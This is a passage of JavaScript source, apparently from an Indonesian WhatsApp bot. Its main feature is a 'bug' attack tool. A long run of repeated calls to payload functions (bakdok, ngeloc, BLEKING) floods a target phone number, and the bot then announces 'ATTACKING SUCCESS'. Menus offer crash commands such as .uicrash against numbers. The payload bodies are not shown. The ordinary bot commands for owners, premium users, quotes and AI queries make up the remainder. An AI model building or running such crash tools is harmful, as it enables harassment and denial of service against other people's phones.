await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await BLEKING(target, wanted)
await BLEKING(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
await ngeloc(target, wanted)
await bakdok(target, wanted)
}
reply(`「 𒈒𝐀𝐓𝐓𝐀𝐂𝐊𝐈𝐍𝐆 𝐒𝐔𝐂𝐂𝐄𝐒𝐒✔ 」
  🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃
│──▄────▄▄▄▄▄▄▄────▄───│
│─▀▀▄─▄█████████▄─▄▀▀──│
│─────██─▀███▀─██──────│
│───▄─▀████▀████▀─▄────│
│─▀█────██▀█▀██────█▀──│
│༂ 𝐀𝐓𝐓𝐀𝐂𝐊 𝐓𝐎 : ${target} ༂         
│༂ 𝐓𝐘𝐏𝐄 𝐁𝐔𝐆 : ${command} ༂
│𝐒𝐜𝐫𝐢𝐩𝐭 𝐓𝐨 𝐕𝐞𝐫𝐬𝐢𝐨𝐧 3.0,
│𝐣𝐚𝐧𝐠𝐚𝐧 𝐦𝐞𝐧𝐠𝐮𝐣𝐢 𝐤𝐞𝐩𝐚𝐝𝐚 
│𝐨𝐫𝐚𝐧𝐠 𝐲𝐚𝐧𝐠 𝐠𝐚𝐤 𝐚𝐝𝐚 𝐬𝐚𝐥𝐚𝐡
╚─────「 𝐁𝐮𝐠 🎃⃟𒆜𝐀𝐠𝐥𝐞𝐫 𝐅𝐨𝐫𝐠𝐞𝐫×⃟🎃 𝐆𝐚𝐜𝐨𝐫🤩」──`)
break

case "owner": {
if (!isPremium) return reply('OWNER KU ANDRA MASIH PEMULA ??')
const repf = await kandiXD.sendMessage(from, { 
contacts: { 
displayName: `${list.length} Kontak`, 
contacts: list }, contextInfo: {
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid: [sender]
}}, { quoted: m })
kandiXD.sendMessage(from, { text : `Nih Owner Gw Jangan Macem"`, contextInfo:{
forwardingScore: 9999999, 
isForwarded: true,
mentionedJid:[sender]
}}, { quoted: repf })
}
break

case "addowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
bnnd = q.split("|")[0].replace(/[^0-9]/g, '')
let ceknye = await kandiXD.onWhatsApp(bnnd + `@s.whatsapp.net`)
if (ceknye.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
ownerNumber.push(bnnd)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${bnnd} Telah Menjadi Owner!!!`)
break

case "delowner":
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')
unp = ownerNumber.indexOf(ya)
ownerNumber.splice(unp, 1)
fs.writeFileSync('./database/dtbs/owner.json', JSON.stringify(ownerNumber))
reply(`Nomor ${ya} Telah Di Hapus Owner!!!`)
break

case 'setowner': {
if (!isOwner) return reply('kusus owner')
if (!text) return reply(`Contoh : ${prefix + command} 62×××`)
global.owner = text.split("|")[0]
 reply(`Exif berhasil diubah menjadi\n\n• No Owner : ${global.owner}`)
}
break

case 'self': {
if (!isOwner) return reply(mess.only.owner)
kandiXD.public = false
reply('Succes Mode Private')
}
break

case "addprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
prrkek = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
let ceknya = await kandiXD.onWhatsApp(prrkek)
if (ceknya.length == 0) return reply(`Masukkan Nomor Yang Valid Dan Terdaftar Di WhatsApp!!!`)
prem.push(prrkek)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${prrkek} Telah Menjadi Premium!`)
}
break

case "delprem":{
if (!isOwner) return reply(mess.only.owner)
if (!args[0]) return reply(`Penggunaan ${prefix+command} nomor\nContoh ${prefix+command} 62×××`)
ya = q.split("|")[0].replace(/[^0-9]/g, '')+`@s.whatsapp.net`
unp = prem.indexOf(ya)
prem.splice(unp, 1)
fs.writeFileSync("./database/dtbs/premium.json", JSON.stringify(prem))
reply(`Nomor ${ya} Telah Di Hapus Premium!`)
}
break

case 'public': {
if (!isOwner) return reply(mess.only.owner)
kandiXD.public = true
reply('Succes Mode Public')
}
break

case "qc": {
if (!isOwner)return reply(mess.only.owner)
if (!quoted){
const getname = await kandiXD.getName(mentionUser[0])
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": getname,
"photo": {
"url": ppuser
}
},
"text": quotedMsg.chats,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
kandiXD.sendStimg(from, buffer, m, opt)
});
} else if (q) {
const json = {
"type": "quote",
"format": "png",
"backgroundColor": "#FFFFFF",
"width": 512,
"height": 768,
"scale": 2,
"messages": [
{
"entities": [],
"avatar": true,
"from": {
"id": 1,
"name": pushname,
"photo": {
"url": ppuser
}
},
"text": q,
"replyMessage": {}
}
]
};
const response = axios.post('https://bot.lyo.su/quote/generate', json, {
headers: {'Content-Type': 'application/json'}
}).then(res => {
const buffer = Buffer.from(res.data.result.image, 'base64')
const opt = { packname: global.packname, author: global.author }
kandiXD.sendStimg(from, buffer, m, opt)
});
} else {
reply(`Kirim perintah ${prefix+command} rafzmids`)
}
}
break

case 'mangap': {
reply(`Makasi Kakak ${pushname} Atas Pujiannya`) 
}
break

case 'ai': {
	if (!text) return reply(`*• Example:* ${prefix + command} Siapakah orang yang telah menemukan Komputer di jaman Majapahit`);  
await kandiXD.sendMessage(m.chat, { react: { text: "⏱️",key: m.key,}}) 
        try {
let gpt = await (await fetch(`https://widipe.com/openai?text=${text}`)).json()
let msgs = generateWAMessageFromContent(m.chat, {
  viewOnceMessage: {
    message: {
        "messageContextInfo": {
          "deviceListMetadata": {},
          "deviceListMetadataVersion": 2
        },
        interactiveMessage: proto.Message.InteractiveMessage.create({
          body: proto.Message.InteractiveMessage.Body.create({
            text: '> kandiXD - AI\n\n' + gpt.result
          }),
          footer: proto.Message.InteractiveMessage.Footer.create({
            text: namabot
          }),
          header: proto.Message.InteractiveMessage.Header.create({
          hasMediaAttachment: false,
          ...await prepareWAMessageMedia({ image: fs.readFileSync('./database/image/ROOTCRASH.jpg')}, { upload: kandiXD.waUploadToServer })  
          }),
          nativeFlowMessage: proto.Message.InteractiveMessage.NativeFlowMessage.create({
            buttons: [{
            "name": "quick_reply",
"buttonParamsJson": `{"display_text":"Nice kandiXD - AI","id":".mangap"}`
            }],
          }),
          contextInfo: {
  mentionedJid: [m.sender], 
  forwardingScore: 999,
  isForwarded: true,
forwardedNewsletterMessageInfo: {
  newsletterJid: '0@newsletter',
  newsletterName: namabot,
  serverMessageId: 143
}
}
       })
    }
  }
}, { quoted: m })
await kandiXD.relayMessage(m.chat, msgs.message, {})
 } catch(e) {
 return reply("Error Kak :(")
}
}
break

case 'halobang': {
if (!isPremium) return reply(mess.only.premium)
let teksbang = `
𝖀𝖓𝖙𝖚𝖐 𝕭𝖚𝖌 𝕻𝖎𝖑𝖎𝖍 𝖄𝖆𝖆
(𝗨𝗻𝘁𝘂𝗸 𝗕𝘂𝗴 𝗣𝗶𝗹𝗶𝗵 𝗬𝗮𝗮)

 令 .𝘂𝗶𝘀𝘆𝘀𝘁𝗲𝗺 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗱𝗲𝘃𝗶𝗰𝗲 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝘂𝗶𝗰𝗿𝗮𝘀𝗵 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗯𝘂𝗴𝘂𝗶 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗺𝗲𝗺𝗲𝗸 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 
 ☝ ＡＤＡ ５ ＰＩＬＩＨＡＮ ＢＵＡＴ ＢＵＧ ☝
 
╭━━━━━━━━━━━━━━ᬼ
│
║ ​᭄ 𝗝𝗶𝗸𝗮 𝗧𝗲𝘁𝗮𝗽 𝗖𝗲𝗻𝘁𝗮𝗻𝗴 𝟮 𝗠𝗮𝗸𝗮 𝘀𝗲𝗱𝗮𝗻𝗴 𝗱𝗲𝗹𝗮𝘆 𝗺𝗮𝗸𝗲𝗿
║ ​᭄ 𝗧𝘂𝗻𝗴𝗴𝘂 𝗦𝗲𝗸𝗶𝘁𝗮𝗿 𝟱-𝟭𝟬 𝗺𝗲𝗻𝗶𝘁 𝗷𝗶𝗸𝗮 𝘄𝗼𝗿𝗸 𝘄𝗮𝗷𝗶𝗯 𝘁𝗮𝗴 𝐀𝐧𝐝𝐫𝐚𝐙𝐲𝐲
║​᭄ 𝗝𝗶𝗸𝗮 𝗧𝗶𝗱𝗮𝗸 𝗪𝗼𝗿𝗸 𝗔𝘁𝗮𝘂 𝗚𝗮𝗴𝗮𝗹 𝗖𝗼𝗯𝗮 𝗟𝗮𝗴𝗶 𝗗𝗲𝗻𝗴𝗮𝗻 𝗖𝗼𝗺𝗺𝗮𝗻𝗱 𝗬𝗮𝗻𝗴 𝗟𝗮𝗶𝗻 ᬊ
│
│ೄྀ 𝗖𝟭 𝗪𝗔𝗝𝗜𝗕 𝗦𝗧𝗢𝗥 𝗞𝗘 6289526156543
║
║ ================== 🌷
│
╰━━━━━━━━━━━━━━━━━━━━ᬼ`
reply(teksbang)
}
break

case 'bang-on?': {
if (!isPremium) return reply(mess.only.premium)
let teksbang = `
𝖀𝖓𝖙𝖚𝖐 𝕭𝖚𝖌 𝕻𝖎𝖑𝖎𝖍 𝖄𝖆𝖆
(𝗨𝗻𝘁𝘂𝗸 𝗕𝘂𝗴 𝗣𝗶𝗹𝗶𝗵 𝗬𝗮𝗮)

 令 .𝘂𝗶𝘀𝘆𝘀𝘁𝗲𝗺 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗱𝗲𝘃𝗶𝗰𝗲 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝘂𝗶𝗰𝗿𝗮𝘀𝗵 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗯𝘂𝗴𝘂𝗶 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 令 .𝗺𝗲𝗺𝗲𝗸 𝟔𝟐𝐱𝐱𝐱𝐱𝐱
 
 ☝ ＡＤＡ ５ ＰＩＬＩＨＡＮ ＢＵＡＴ ＢＵＧ ☝
 
╭━━━━━━━━━━━━━━ᬼ
│
